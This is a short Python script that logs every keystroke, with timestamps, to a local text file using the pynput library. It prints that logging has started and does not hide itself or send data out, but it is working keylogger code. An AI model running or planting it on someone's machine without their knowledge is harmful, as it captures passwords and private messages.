from pynput import keyboard
import time

def record_keystroke(key):
    with open("activity_log.txt", "a") as file:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        file.write(f"{timestamp} - {key}\n")

def start_logging():
    print("Logging started. Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=record_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    start_logging()
